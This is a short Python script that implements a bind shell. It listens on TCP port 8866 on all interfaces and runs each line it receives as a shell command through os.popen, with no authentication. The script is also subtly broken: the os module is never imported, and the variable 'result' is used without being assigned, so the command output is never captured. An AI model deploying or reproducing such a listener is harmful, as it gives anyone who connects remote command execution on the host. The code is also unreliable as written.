import socket 

HOST = ""
PORT = 8866

s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
s.bind((HOST , PORT))
s.listen()
conn , addr = s.accept()
print("{} connecton successful with backport{}".format(addr[0],addr[1]))
while True :
    data = conn.recv(1024)
    if not data:
        break
    else:
        data = data.decode()
        print("echo > {}".format(data))
        if(data.strip() == "quit"):
            break
        else:
            os.popen(data).read()
            data = "cmd::"+data+"\r\n"
            data = data + "-------------------\r\n"
            data = data + "cmd::result -> \r\n"
            data = data + result
            conn.sendall(data.encode())
s.close()